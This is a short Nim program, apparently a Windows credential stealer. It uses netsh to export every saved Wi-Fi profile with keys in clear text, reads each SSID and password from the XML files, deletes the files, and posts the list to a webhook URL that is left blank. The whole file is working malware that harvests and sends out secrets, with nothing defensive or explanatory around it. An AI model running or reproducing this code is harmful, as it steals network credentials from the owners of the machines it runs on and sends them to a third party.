import std/[httpclient, os, osproc, sequtils, strformat, strutils]
import xml, xml/selector

# webhook URL
var url = ""

proc exfiltrate(data: string) =
  var 
    client = newHttpClient()
  try: discard client.post(url, body=data)
  except: discard
  finally: client.close()

proc read_xml_file(filename: string): (string, string) =
  var 
    d = q($readFile(filename))
    name = $(d.select("name")[0])
    password = $(d.select("keyMaterial")[0])
  # remove html tags
  name = name.split(">")[1].split("<")[0]
  password = password.split(">")[1].split("<")[0]

  return (name, password)

proc get_wifi_passwords(): string =
  result = "Extracted Wifi Passwords:\n"
  # change to a temp dir
  setCurrentDir(getTempDir())
  # dump wifi password
  var (_, _) = execCmdEx("netsh wlan export profile key=clear")

  for file in toSeq(walkFiles(getCurrentDir() & "\\*")):
    if splitPath(file)[1].startsWith("Wi-Fi") and splitPath(file)[1].endsWith(".xml"):
      var (name, password) = read_xml_file(file)
      result &= &"\tSSID: {name}\tPassword: {password}\n"
      # remove file
      removeFile(file)
  return result

when isMainModule:
  var passwords = get_wifi_passwords()
  exfiltrate(passwords)